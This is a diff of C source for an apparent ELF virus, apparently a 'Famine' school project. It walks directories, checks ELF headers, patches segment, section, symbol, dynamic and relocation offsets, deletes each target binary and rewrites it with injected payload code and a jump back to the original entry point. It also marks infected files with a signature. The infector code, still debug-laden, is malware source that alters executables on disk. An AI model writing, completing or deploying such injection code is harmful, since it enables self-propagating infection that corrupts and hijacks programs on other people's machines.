@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/05/22 21:17:01 by root              #+#    #+#             */
-/*   Updated: 2018/06/21 22:47:43 by root             ###   ########.fr       */
+/*   Updated: 2018/06/22 18:01:15 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -31,7 +31,7 @@
 
 void			find_files(char *dir);
 void			get_dat_elf(char *dir, char *file);
-void			pack_dat_elf(char *path, int size, char *data);
+void			pack_dat_elf(char *path, int size, u_char *data);
 int				dat_elf_is_infected(char *data, Elf64_Shdr *sec);
 void			famine64_func(void);
 extern uint32_t	famine64_size;
@@ -121,17 +121,17 @@ void	get_dat_elf(char *dir, char *file)
 	syscall(MUNMAP, data, size);
 }
 
-void		pack_dat_elf(char *path, int size, char *data)
+void		pack_dat_elf(char *path, int size, u_char *data)
 {
 	printf("file: %s \\ ", path);
 	if (data[0] == 0x7f && data[1] == 'E' && data[2] == 'L' && data[3] == 'F' &&
 		data[4] == ELFCLASS64 && data[5] != 0 && data[6] == 1 && (data[16] == 2 || data[16] == 3))
 	{
-		/* 1. Find the first PT_LOAD segment */
+		/* 1. Find the last PT_LOAD segment */
 		size_t	phoff = ((Elf64_Ehdr *)data)->e_phoff;
 		Elf64_Phdr *program = (Elf64_Phdr *)(data + phoff);
 		Elf64_Phdr *iprogram = NULL;
-		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_phnum && !iprogram; i++) {
+		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_phnum; i++) {
 			if (program[i].p_type == PT_LOAD) {
 				iprogram = &program[i];
 			}
@@ -139,19 +139,19 @@ void		pack_dat_elf(char *path, int size, char *data)
 		if (iprogram == NULL) /* Weird if its NULL */
 			return ;
 
-		/* 2. Find the .text section of the last PT_LOAD */
-		/*    depending on the entry point.              */
-		Elf64_Addr old_entry = ((Elf64_Ehdr *)data)->e_entry;
+		/* 2. Find the last section of the last PT_LOAD */
 		size_t	shoff = ((Elf64_Ehdr *)data)->e_shoff;
 		Elf64_Shdr *section = (Elf64_Shdr *)(data + shoff);
 		Elf64_Shdr *isection = NULL;
-		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum && !isection; i++) {
-			if (old_entry >= section[i].sh_addr && old_entry < section[i].sh_addr + section[i].sh_size) {
+		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum; i++) {
+			if (section[i].sh_addr >= iprogram->p_vaddr &&
+				(!isection || section[i].sh_addr > isection->sh_addr)) {
 				isection = &section[i];
 			}
 		}
 		if (isection == NULL) /* Weird if its NULL */
 			return ;
+		isection--;
 
 		if (dat_elf_is_infected(data, isection))
 			return ;
@@ -169,41 +169,31 @@ void		pack_dat_elf(char *path, int size, char *data)
 
 		syscall(UNLINK, path); /* Erase the file from system tree */
 
-		uint64_t padding = famine64_size + famine64_size % isection->sh_addralign;
-		printf("padding: %ld\n", famine64_size % isection->sh_addralign);
-		/* 3. Modify segments offset higher than .text segment offset + size */
-		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_phnum; i++) {
-			if (program[i].p_offset >= iprogram->p_offset + iprogram->p_filesz) {
-				program[i].p_offset += padding;
-				program[i].p_vaddr += padding;
-				program[i].p_paddr += padding;
-			}
-		}
+		uint64_t padding = famine64_size;
 		
-		/* 4. Modify dynamic section */
+		/* 4. Modify symbol values */
 		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum; i++) {
-			if (section[i].sh_type == SHT_DYNAMIC) {
-				Elf64_Dyn	*dynamic = (Elf64_Dyn *)(data + section[i].sh_offset);
+			if (section[i].sh_type == SHT_SYMTAB || section[i].sh_type == SHT_DYNSYM) {
+				Elf64_Sym *symbol = (Elf64_Sym *)(data + section[i].sh_offset);
+				printf("symtab size: %x nb: %x\n", section[i].sh_size, section[i].sh_size / section[i].sh_entsize);
 				for (size_t j = 0; j < section[i].sh_size / section[i].sh_entsize; j++) {
-					if (dynamic->d_un.d_val >= isection->sh_offset + isection->sh_size &&
-						dynamic->d_tag < 0x6ffffffb)
-						dynamic->d_un.d_val += padding;
-					else if (dynamic->d_un.d_ptr >= isection->sh_offset + isection->sh_size &&
-						dynamic->d_tag < 0x6ffffffb)
-						dynamic->d_un.d_ptr += padding;
-					dynamic++;
+					if (symbol->st_value >= isection->sh_addr + isection->sh_size)
+						symbol->st_value += padding;
+					symbol++;
 				}
 			}
 		}
 
-		/* 5. Modify symbol values */
+		/* 5. Modify dynamic section */
 		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum; i++) {
-			if (section[i].sh_type == SHT_SYMTAB) {
-				Elf64_Sym *symbol = (Elf64_Sym *)(data + section[i].sh_offset);
+			if (section[i].sh_type == SHT_DYNAMIC) {
+				Elf64_Dyn	*dynamic = (Elf64_Dyn *)(data + section[i].sh_offset);
 				for (size_t j = 0; j < section[i].sh_size / section[i].sh_entsize; j++) {
-					if (symbol->st_value >= isection->sh_offset + isection->sh_size)
-						symbol->st_value += padding;
-					symbol++;
+					if (dynamic->d_un.d_val >= isection->sh_addr + isection->sh_size)
+						dynamic->d_un.d_val += padding;
+					else if (dynamic->d_un.d_ptr >= isection->sh_addr + isection->sh_size)
+						dynamic->d_un.d_ptr += padding;
+					dynamic++;
 				}
 			}
 		}
@@ -213,25 +203,39 @@ void		pack_dat_elf(char *path, int size, char *data)
 			if (section[i].sh_type == SHT_RELA) {
 				Elf64_Rela *rela = (Elf64_Rela *)(data + section[i].sh_offset);
 				for (size_t j = 0; j < section[i].sh_size / section[i].sh_entsize; j++) {
-					if (rela->r_offset >= isection->sh_offset + isection->sh_size)
+					if (rela->r_offset >= isection->sh_addr + isection->sh_size)
 						rela->r_offset += padding;
-					if (rela->r_addend >= isection->sh_offset + isection->sh_size)
+					if (rela->r_addend >= isection->sh_addr + isection->sh_size)
 						rela->r_addend += padding;
 					rela++;
 				}
 			}
 		}
 
-		/* 5. Modify sections offset higher than .text section offset + size */
+		/* 7. Modify sections offset higher than last section offset + size */
 		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum; i++) {
 			if (section[i].sh_offset >= isection->sh_offset + isection->sh_size) {
+				section[i].sh_offset += padding;
 				if (section[i].sh_addr)
 					section[i].sh_addr += padding;
-				section[i].sh_offset += padding;
 			}
 		}
 
+		/* /\* 8. Modify the call parameters of .text *\/ */
+		/* for (size_t i = 0; i < isection->sh_size; i++) { */
+		/* 	if (*(data + isection->sh_offset + i) == 0xff) { */
+		/* 		if (i + 1 < isection->sh_size) { */
+		/* 			if (*(data + isection->sh_offset + i + 1) == 0x15) { */
+		/* 				printf("0xff15 found @offset: 0x%-5x @value: %p", i, *(uint32_t *)(data + isection->sh_offset + i + 2)); */
+		/* 				*(uint32_t *)(data + isection->sh_offset + i + 2) += padding; */
+		/* 				printf(" @new: %p\n", *(uint32_t *)(data + isection->sh_offset + i + 2)); */
+		/* 			} */
+		/* 		} */
+		/* 	} */
+		/* } */
+
 		/* 4. Change the elf header */
+		Elf64_Addr old_entry = ((Elf64_Ehdr *)data)->e_entry;
 //		((Elf64_Ehdr *)data)->e_entry = isection->sh_offset + isection->sh_size;
 		((Elf64_Ehdr *)data)->e_shoff += padding;
 //		((Elf64_Ehdr *)data)->e_shnum += 1;
@@ -245,6 +249,7 @@ void		pack_dat_elf(char *path, int size, char *data)
 		iprogram->p_memsz += padding;
 		iprogram->p_filesz += padding;
 
+		isection->sh_size += padding;
 		/* TODO: check if injecting our program dont over extend the segment alignment */
 
 		/* Re-create the file */
@@ -256,16 +261,16 @@ void		pack_dat_elf(char *path, int size, char *data)
 		}
 
 		/* Re-write the file */
-		size_t off = isection->sh_offset + isection->sh_size;
+		size_t off = isection->sh_offset + isection->sh_size - famine64_size;
 		if (write(fd, data, off) < 0)
 			return ;
-		for (uint32_t i = 0; i < padding; i++)
+		if (write(fd, &famine64_func, famine64_size - sizeof(old_entry)) < 0)
+			return ;
+		Elf64_Addr jump = old_entry;
+		if (write(fd, &jump, sizeof(jump)) < 0)
+			return ;
+		for (uint32_t i = 0; i < padding - famine64_size; i++)
 			write(fd, "\0", 1);
-		/* if (write(fd, &famine64_func, famine64_size - sizeof(old_entry)) < 0) */
-		/* 	return ; */
-		/* Elf64_Addr jump = old_entry - newsect.sh_addr; */
-		/* if (write(fd, &jump, sizeof(jump)) < 0) */
-		/* 	return ; */
 		/* size_t off2 = (uint64_t)isection - (uint64_t)data + sizeof(*isection); */
 		/* write(fd, data + off, off2 - off); */
 		/* write(fd, &newsect, sizeof(newsect)); */
@@ -278,7 +283,7 @@ void		pack_dat_elf(char *path, int size, char *data)
 int		dat_elf_is_infected(char *data, Elf64_Shdr *sec)
 {
 	uint64_t signature = *(uint64_t *)(data + sec->sh_offset + sec->sh_size - 16);
-	printf("%#llx\n", signature);
+	printf(" signature: %#llx\n", signature);
 	if (((Elf64_Ehdr *)data)->e_ident[EI_DATA] == 1) // Little-endian
 		return (signature == 0x24EFAC2442CAFE42);
 	return (signature == 0x42CAFE4224EFAC24);
